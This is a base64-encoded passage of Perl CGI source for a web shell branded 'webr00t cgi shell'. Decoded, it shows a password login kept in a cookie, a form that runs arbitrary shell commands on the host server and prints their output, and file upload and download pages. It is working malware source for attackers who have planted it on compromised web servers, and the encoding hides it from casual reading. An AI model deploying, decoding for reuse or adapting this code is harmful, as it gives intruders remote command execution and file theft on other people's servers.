cy9cIi8vZzsKCQkkaW57J2YnfSA9fiBzL1xzLy9nOwoKCQkjIHBhcnNlIHRyYWlsZXIKCQlmb3Io
JGk9MjsgJGxpc3RbJGldOyAkaSsrKQoJCXsgCgkJCSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8v
OwoJCQkkbGlzdFskaV0gPX4gL1wiKFx3KylcIi87CgkJCSRrZXkgPSAkMTsKCQkJJHZhbCA9ICQn
OwoJCQkkdmFsID1+IHMvKF4oXHJcblxyXG58XG5cbikpfChcclxuJHxcbiQpLy9nOwoJCQkkdmFs
ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkaW57JGtleX0gPSAkdmFsOyAK
CQl9Cgl9CgllbHNlICMgc3RhbmRhcmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRp
cGFydCkKCXsKCQlAaW4gPSBzcGxpdCgvJi8sICRpbik7CgkJZm9yZWFjaCAkaSAoMCAuLiAkI2lu
KQoJCXsKCQkJJGluWyRpXSA9fiBzL1wrLyAvZzsKCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0v
LCAkaW5bJGldLCAyKTsKCQkJJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsK
CQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsKCQkJJGlueyRrZXl9IC49
ICJcMCIgaWYgKGRlZmluZWQoJGlueyRrZXl9KSk7CgkJCSRpbnska2V5fSAuPSAkdmFsOwoJCX0K
CX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBQYWdlIEhlYWRl
cgojIEFyZ3VtZW50IDE6IEZvcm0gaXRlbSBuYW1lIHRvIHdoaWNoIGZvY3VzIHNob3VsZCBiZSBz
ZXQKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRQYWdlSGVhZGVyCnsKCSRFbmNvZGVk
Q3VycmVudERpciA9ICRDdXJyZW50RGlyOwoJJEVuY29kZWRDdXJyZW50RGlyID1+IHMvKFteYS16
QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsKCXByaW50ICJDb250ZW50LXR5cGU6IHRl
eHQvaHRtbFxuXG4iOwoJcHJpbnQgPDxFTkQ7CjxodG1sPgo8aGVhZD4KPHRpdGxlPndlYnIwMHQg
Y2dpIHNoZWxsPC90aXRsZT4KJEh0bWxNZXRhSGVhZGVyCgo8bWV0YSBuYW1lPSJrZXl3b3JkcyIg
Y29udGVudD0iV6PfUm9vVCx3ZWJyMDB0LHdlYnIwMHQuaW5mbyxoYWNrZXIiPgo8bWV0YSBuYW1l
PSJkZXNjcmlwdGlvbiIgY29udGVudD0iV6PfUm9vVCx3ZWJyMDB0LHdlYnIwMHQuaW5mbyxoYWNr
ZXIiPgo8L2hlYWQ+Cjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5mb2N1cygpIiBiZ2NvbG9y
PSIjRkZGRkZGIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1hcmdpbndpZHRoPSIwIiBt
YXJnaW5oZWlnaHQ9IjAiIHRleHQ9IiNGRjAwMDAiPgo8dGFibGUgYm9yZGVyPSIxIiB3aWR0aD0i
MTAwJSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIyIj4KPHRyPgo8dGQgYmdjb2xvcj0i
I0ZGRkZGRiIgYm9yZGVyY29sb3I9IiNGRkZGRkYiIGFsaWduPSJjZW50ZXIiIHdpZHRoPSIxJSI+
CjxiPjxmb250IHNpemU9IjIiPiM8L2ZvbnQ+PC9iPjwvdGQ+Cjx0ZCBiZ2NvbG9yPSIjRkZGRkZG
IiB3aWR0aD0iOTglIj48Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj48Yj4gCjxiIHN0eWxl
PSJjb2xvcjpibGFjaztiYWNrZ3JvdW5kLWNvbG9yOiNmZmZmNjYiPndlYnIwMHQgY2dpIHNoZWxs
PC9iPiBDb25uZWN0ZWQgdG8gJFNlcnZlck5hbWU8L2I+PC9mb250PjwvdGQ+CjwvdHI+Cjx0cj4K
PHRkIGNvbHNwYW49IjIiIGJnY29sb3I9IiNGRkZGRkYiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNp
emU9IjIiPgoKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJy
ZW50RGlyIj48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+VXBsb2FkIEZpbGU8L2ZvbnQ+PC9hPiB8IAo8
YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZkPSRFbmNvZGVkQ3VycmVudERpciI+
PGZvbnQgY29sb3I9IiNGRjAwMDAiPkRvd25sb2FkIEZpbGU8L2ZvbnQ+PC9hPiB8CjxhIGhyZWY9
IiRTY3JpcHRMb2NhdGlvbj9hPWxvZ291dCI+PGZvbnQgY29sb3I9IiNGRjAwMDAiPkRpc2Nvbm5l
Y3Q8L2ZvbnQ+PC9hPiB8CjwvZm9udD48L3RkPgo8L3RyPgo8L3RhYmxlPgo8Zm9udCBzaXplPSIz
Ij4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVl
bgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luU2NyZWVuCnsKCSRNZXNzYWdl
ID0gcSQ8cHJlPjxpbWcgYm9yZGVyPSIwIiBzcmM9Imh0dHA6Ly9pbWc4MTAuaW1hZ2VzaGFjay51
cy9pbWc4MTAvODA0My93ZWJyMDB0MTIucG5nIj48L3ByZT48YnI+PGJyPjwvZm9udD48aDE+U2lm
cmU9d2VicjAwdDwvaDE+CiQ7CiMnCglwcmludCA8PEVORDsKPGNvZGU+CgpUcnlpbmcgJFNlcnZl
ck5hbWUuLi48YnI+CkNvbm5lY3RlZCB0byAkU2VydmVyTmFtZTxicj4KRXNjYXBlIGNoYXJhY3Rl
ciBpcyBeXQo8Y29kZT4kTWVzc2FnZQpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFBy
aW50cyB0aGUgbWVzc2FnZSB0aGF0IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4K
Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2UKewoJcHJp
bnQgPDxFTkQ7Cjxjb2RlPgo8YnI+bG9naW46IGFkbWluPGJyPgpwYXNzd29yZDo8YnI+CkxvZ2lu
IGluY29ycmVjdDxicj48YnI+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0K
IyBQcmludHMgdGhlIEhUTUwgZm9ybSBmb3IgbG9nZ2luZyBpbgojLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tCnN1YiBQcmludExvZ2luRm9ybQp7CglwcmludCA8PEVORDsKPGNvZGU+Cgo8Zm9ybSBuYW1l
PSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KPGlucHV0IHR5cGU9
ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImxvZ2luIj4KPC9mb250Pgo8Zm9udCBzaXplPSIzIj4K
bG9naW46IDxiIHN0eWxlPSJjb2xvcjpibGFjaztiYWNrZ3JvdW5kLWNvbG9yOiNmZmZmNjYiPndl
YnIwMHQgY2dpIHNoZWxsPC9iPjxicj4KcGFzc3dvcmQ6PC9mb250Pjxmb250IGNvbG9yPSIjMDA5
OTAwIiBzaXplPSIzIj48aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InAiPgo8aW5wdXQgdHlw
ZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIGZvb3RlciBmb3IgdGhlIEhUTUwgUGFnZQojLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludFBhZ2VGb290ZXIKewoJcHJpbnQgIjwvZm9udD48
L2JvZHk+PC9odG1sPiI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBSZXRyZWl2ZXMgdGhl
IHZhbHVlcyBvZiBhbGwgY29va2llcy4gVGhlIGNvb2tpZXMgY2FuIGJlIGFjY2Vzc2VzIHVzaW5n
IHRoZQojIHZhcmlhYmxlICRDb29raWVzeycnfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBH
ZXRDb29raWVzCnsKCUBodHRwY29va2llcyA9IHNwbGl0KC87IC8sJEVOVnsnSFRUUF9DT09LSUUn
fSk7Cglmb3JlYWNoICRjb29raWUoQGh0dHBjb29raWVzKQoJewoJCSgkaWQsICR2YWwpID0gc3Bs
aXQoLz0vLCAkY29va2llKTsKCQkkQ29va2llc3skaWR9ID0gJHZhbDsKCX0KfQoKIy0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgc2NyZWVuIHdoZW4gdGhlIHVzZXIgbG9ncyBvdXQK
Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRMb2dvdXRTY3JlZW4KewoJcHJpbnQgIjxj
b2RlPkNvbm5lY3Rpb24gY2xvc2VkIGJ5IGZvcmVpZ24gaG9zdC48YnI+PGJyPjwvY29kZT4iOwp9
CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0
aGUgdXNlciB0byBsb2dpbiBhZ2FpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQZXJmb3Jt
TG9nb3V0CnsKCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNz
d29yZCBjb29raWUKCSZQcmludFBhZ2VIZWFkZXIoInAiKTsKCSZQcmludExvZ291dFNjcmVlbjsK
CgkmUHJpbnRMb2dpblNjcmVlbjsKCSZQcmludExvZ2luRm9ybTsKCSZQcmludFBhZ2VGb290ZXI7
Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBs
b2dpbiB0aGUgdXNlci4gSWYgdGhlIHBhc3N3b3JkIG1hdGNoZXMsIGl0CiMgZGlzcGxheXMgYSBw
YWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3Jk
IGRvZW5zJ3QKIyBtYXRjaCBvciBpZiBubyBwYXNzd29yZCBpcyBlbnRlcmVkLCBpdCBkaXNwbGF5
cyBhIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIKIyB0byBsb2dpbgojLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tCnN1YiBQZXJmb3JtTG9naW4gCnsKCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29y
ZCkgIyBwYXNzd29yZCBtYXRjaGVkCgl7CgkJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPSRM
b2dpblBhc3N3b3JkO1xuIjsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJlByaW50Q29tbWFu
ZExpbmVJbnB1dEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KCWVsc2UgIyBwYXNzd29yZCBk
aWRuJ3QgbWF0Y2gKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkJJlByaW50TG9naW5TY3Jl
ZW47CgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJl
ZAoJCXsKCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOwoKCQl9CgkJJlByaW50TG9naW5Gb3Jt
OwoJCSZQcmludFBhZ2VGb290ZXI7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmlu
dHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBjb21tYW5kcwoj
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtCnsKCSRQ
cm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAk
Q3VycmVudERpcl1cJCAiOwoJcHJpbnQgPDxFTkQ7Cjxjb2RlPgo8Zm9ybSBuYW1lPSJmIiBtZXRo
b2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIg
bmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2
YWx1ZT0iJEN1cnJlbnREaXIiPgokUHJvbXB0CjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjIj4K
PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgo8L2NvZGU+CgpFTkQK
fQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxs
b3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3Vi
IFByaW50RmlsZURvd25sb2FkRm9ybQp7CgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGly
PiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsKCXByaW50IDw8RU5E
Owo8Y29kZT4KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2Nh
dGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+
CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+CiRQcm9tcHQg
ZG93bmxvYWQ8YnI+PGJyPgpGaWxlbmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImYiIHNp
emU9IjM1Ij48YnI+PGJyPgpEb3dubG9hZDogPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJl
Z2luIj4KPC9mb3JtPgo8L2NvZGU+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJp
bnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2FkIGZpbGVzCiMt
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0KewoJJFByb21wdCA9
ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50
RGlyXVwkICI7CglwcmludCA8PEVORDsKPGNvZGU+Cgo8Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJt
dWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9u
Ij4KJFByb21wdCB1cGxvYWQ8YnI+PGJyPgpGaWxlbmFtZTogPGlucHV0IHR5cGU9ImZpbGUiIG5h
bWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPgpPcHRpb25zOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hl
Y2tib3giIG5hbWU9Im8iIHZhbHVlPSJvdmVyd3JpdGUiPgpPdmVyd3JpdGUgaWYgaXQgRXhpc3Rz
PGJyPjxicj4KVXBsb2FkOiZuYnNwOyZuYnNwOyZuYnNwOzxpbnB1dCB0eXBlPSJzdWJtaXQiIHZh
bHVlPSJCZWdpbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVu
dERpciI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPgo8L2Zv
cm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9u
IGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVl
ZCB0bwojIHRlcm1pbmF0ZSB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5LiBUaGlzIGZ1bmN0aW9uIGlz
IHZhbGlkIG9ubHkgb24gVW5peC4gSXQgaXMKIyBuZXZlciBjYWxsZWQgd2hlbiB0aGUgc2NyaXB0
IGlzIHJ1bm5pbmcgb24gTlQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIENvbW1hbmRUaW1l
b3V0CnsKCWlmKCEkV2luTlQpCgl7CgkJYWxhcm0oMCk7CgkJcHJpbnQgPDxFTkQ7CjwveG1wPgoK
PGNvZGU+CkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1
cmF0aW9uIHNlY29uZChzKS4KPGJyPktpbGxlZCBpdCEKRU5ECgkJJlByaW50Q29tbWFuZExpbmVJ
bnB1dEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCQlleGl0OwoJfQp9CgojLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4g
SXQgZGlzcGxheXMgdGhlIG91dHB1dCBvZiB0aGUKIyBjb21tYW5kIGFuZCBhbGxvd3MgdGhlIHVz
ZXIgdG8gZW50ZXIgYW5vdGhlciBjb21tYW5kLiBUaGUgY2hhbmdlIGRpcmVjdG9yeQojIGNvbW1h
bmQgaXMgaGFuZGxlZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9y
eSBpcyBzdG9yZWQgaW4KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRp
bWUgYSBjb21tYW5kIGhhcyB0byBiZSBleGVjdXRlZC4gVGhlCiMgb3V0cHV0IG9mIHRoZSBjaGFu
Z2UgZGlyZWN0b3J5IGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZCB0byB0aGUgdXNlcnMKIyB0aGVy
ZWZvcmUgZXJyb3IgbWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4KIy0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLQpzdWIgRXhlY3V0ZUNvbW1hbmQKewoJaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2Rc
cysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZAoJewoJCSMgd2UgY2hhbmdlIHRo
ZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUKCQkjIGNvbW1hbmQgaXMg
bm90IGRpc3BsYXllZC4KCQkKCQkkT2xkRGlyID0gJEN1cnJlbnREaXI7CgkJJENvbW1hbmQgPSAi
Y2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4kQ21kUHdkOwoJCWNo
b3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJ
JFByb21wdCA9ICRXaW5OVCA/ICIkT2xkRGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJE9s
ZERpcl1cJCAiOwoJCXByaW50ICIkUHJvbXB0ICRSdW5Db21tYW5kIjsKCX0KCWVsc2UgIyBzb21l
IG90aGVyIGNvbW1hbmQsIGRpc3BsYXkgdGhlIG91dHB1dAoJewoJCSZQcmludFBhZ2VIZWFkZXIo
ImMiKTsKCQkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNl
cnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsKCQlwcmludCAiJFByb21wdCAkUnVuQ29tbWFuZDx4
bXA+IjsKCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1h
bmQuJFJlZGlyZWN0b3I7CgkJaWYoISRXaW5OVCkKCQl7CgkJCSRTSUd7J0FMUk0nfSA9IFwmQ29t
bWFuZFRpbWVvdXQ7CgkJCWFsYXJtKCRDb21tYW5kVGltZW91dER1cmF0aW9uKTsKCQl9CgkJaWYo
JFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZAoJCXsK
CQkJJHw9MTsKCQkJJENvbW1hbmQgLj0gIiB8IjsKCQkJb3BlbihDb21tYW5kT3V0cHV0LCAkQ29t
bWFuZCk7CgkJCXdoaWxlKDxDb21tYW5kT3V0cHV0PikKCQkJewoJCQkJJF8gPX4gcy8oXG58XHJc
bikkLy87CgkJCQlwcmludCAiJF9cbiI7CgkJCX0KCQkJJHw9MDsKCQl9CgkJZWxzZSAjIHNob3cg
b3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzCgkJewoJCQlwcmludCBgJENvbW1hbmRgOwoJ
CX0KCQlpZighJFdpbk5UKQoJCXsKCQkJYWxhcm0oMCk7CgkJfQoJCXByaW50ICI8L3htcD4iOwoJ
fQoJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkmUHJpbnRQYWdlRm9vdGVyOwp9CgojLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBkaXNwbGF5cyB0aGUgcGFnZSB0aGF0
IGNvbnRhaW5zIGEgbGluayB3aGljaCBhbGxvd3MgdGhlIHVzZXIKIyB0byBkb3dubG9hZCB0aGUg
c3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gKIyBm
ZWF0dXJlIHRoYXQgc3RhcnRzIHRoZSBkb3dubG9hZCBhdXRvbWF0aWNhbGx5LgojIEFyZ3VtZW50
IDE6IEZ1bGx5IHF1YWxpZmllZCBmaWxlbmFtZSBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVk
CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RG93bmxvYWRMaW5rUGFnZQp7Cglsb2Nh
bCgkRmlsZVVybCkgPSBAXzsKCWlmKC1lICRGaWxlVXJsKSAjIGlmIHRoZSBmaWxlIGV4aXN0cwoJ
ewoJCSMgZW5jb2RlIHRoZSBmaWxlIGxpbmsgc28gd2UgY2FuIHNlbmQgaXQgdG8gdGhlIGJyb3dz
ZXIKCQkkRmlsZVVybCA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7
CgkJJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJs
Jm89Z28iOwoJCSRIdG1sTWV0YUhlYWRlciA9ICI8bWV0YSBIVFRQLUVRVUlWPVwiUmVmcmVzaFwi
IENPTlRFTlQ9XCIxOyBVUkw9JERvd25sb2FkTGlua1wiPiI7CgkJJlByaW50UGFnZUhlYWRlcigi
YyIpOwoJCXByaW50IDw8RU5EOwo8Y29kZT4KClNlbmRpbmcgRmlsZSAkVHJhbnNmZXJGaWxlLi4u
PGJyPgpJZiB0aGUgZG93bmxvYWQgZG9lcyBub3Qgc3RhcnQgYXV0b21hdGljYWxseSwKPGEgaHJl
Zj0iJERvd25sb2FkTGluayI+Q2xpY2sgSGVyZTwvYT4uCkVORAoJCSZQcmludENvbW1hbmRMaW5l
SW5wdXRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7Cgl9CgllbHNlICMgZmlsZSBkb2Vzbid0IGV4
aXN0Cgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCXByaW50ICJGYWlsZWQgdG8gZG93bmxv
YWQgJEZpbGVVcmw6ICQhIjsKCQkmUHJpbnRGaWxlRG93bmxvYWRGb3JtOwoJCSZQcmludFBhZ2VG
b290ZXI7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
